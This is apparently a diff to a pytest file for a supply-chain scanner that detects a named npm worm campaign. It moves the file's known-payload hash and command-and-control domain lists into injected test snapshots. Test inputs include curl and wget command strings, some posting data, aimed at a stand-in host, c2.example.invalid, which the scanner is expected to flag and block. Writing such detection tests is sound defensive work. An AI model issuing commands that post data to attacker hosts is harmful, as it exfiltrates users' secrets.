@@ -8,6 +8,7 @@ import pytest
 from aurascan.analyzers import npm_supply_chain as campaign
 from aurascan.analyzers.deterministic import DeterministicAnalyzer
 from aurascan.core.models import EvidenceQuality, Phase, Severity
+from tests.helpers.intelligence_fixtures import inert_signature_snapshot, inert_domain_snapshot
 
 
 EXACT = "SUPPLYCHAIN-NPM-SHAIHULUD-20260907"
@@ -23,8 +24,8 @@ TUPLES = [
 ]
 
 
-def shell(text, phase=Phase.pkgbuild_static):
-    return campaign.analyze_npm_install_commands(text, "PKGBUILD", phase)
+def shell(text, phase=Phase.pkgbuild_static, intelligence_snapshot=None):
+    return campaign.analyze_npm_install_commands(text, "PKGBUILD", phase, intelligence_snapshot)
 
 
 def metadata(data, path="package.json"):
@@ -269,14 +270,14 @@ def test_captured_bytes_hash_only_and_no_checksum_mention_matches(monkeypatch):
     assert campaign.known_payload_findings("index.js", payload) == []
     for known in campaign.KNOWN_PAYLOAD_SHA256:
         assert campaign.known_payload_findings("checksums.txt", known.encode("ascii")) == []
-    monkeypatch.setattr(campaign, "KNOWN_PAYLOAD_SHA256", frozenset({digest}))
-    result = campaign.known_payload_findings("renamed.data", payload)
+    intelligence = inert_signature_snapshot(payload)
+    result = campaign.known_payload_findings("renamed.data", payload, intelligence)
     assert result[0].rule_id == "DEEPSTATIC-NPM-SHAIHULUD-PAYLOAD-001"
     assert result[0].evidence_quality == EvidenceQuality.confirmed_signature
     assert result[0].file_hash == digest
     assert result[0].blocks_installation
-    assert campaign.known_payload_digest_findings("renamed.data", digest)[0].file_hash == digest
-    assert campaign.known_payload_findings("index.js", payload + b"changed") == []
+    assert campaign.known_payload_digest_findings("renamed.data", digest, intelligence)[0].file_hash == digest
+    assert campaign.known_payload_findings("index.js", payload + b"changed", intelligence) == []
 
 
 def test_production_intelligence_preserves_known_payload_and_verified_sources():
@@ -313,12 +314,12 @@ def test_production_domain_matching_is_a_local_hostname_comparison(value, expect
     "wget --post-data --help https://c2.example.invalid/path",
 ])
 def test_active_destination_correlation_uses_injected_reserved_domain(monkeypatch, command):
-    monkeypatch.setattr(campaign, "_MALICIOUS_DOMAINS", ("c2.example.invalid",))
-    result = shell(command)
+    intelligence = inert_domain_snapshot()
+    result = shell(command, intelligence_snapshot=intelligence)
     assert [f.rule_id for f in result] == [C2]
     assert result[0].blocks_installation
     assert "fixture-secret" not in json.dumps(result[0].to_dict())
-    assert shell(command, Phase.unpacked_source_scan)[0].rule_id == "DEEPSTATIC-NPM-SHAIHULUD-C2-001"
+    assert shell(command, Phase.unpacked_source_scan, intelligence)[0].rule_id == "DEEPSTATIC-NPM-SHAIHULUD-C2-001"
 
 
 @pytest.mark.parametrize("command", [
@@ -341,12 +342,12 @@ def test_active_destination_correlation_uses_injected_reserved_domain(monkeypatc
     "wget --help https://c2.example.invalid/path",
 ])
 def test_network_option_values_messages_and_lookalikes_are_not_destinations(monkeypatch, command):
-    monkeypatch.setattr(campaign, "_MALICIOUS_DOMAINS", ("c2.example.invalid",))
-    assert shell(command) == []
+    intelligence = inert_domain_snapshot()
+    assert shell(command, intelligence_snapshot=intelligence) == []
 
 
 def test_unknown_network_option_preserves_coverage_without_claiming_destination(monkeypatch):
-    monkeypatch.setattr(campaign, "_MALICIOUS_DOMAINS", ("c2.example.invalid",))
-    result = shell("curl --unknown-option https://c2.example.invalid/path")
+    intelligence = inert_domain_snapshot()
+    result = shell("curl --unknown-option https://c2.example.invalid/path", intelligence_snapshot=intelligence)
     assert [f.rule_id for f in result] == [COMMAND_COVERAGE]
     assert result[0].blocks_installation and result[0].severity == Severity.HIGH
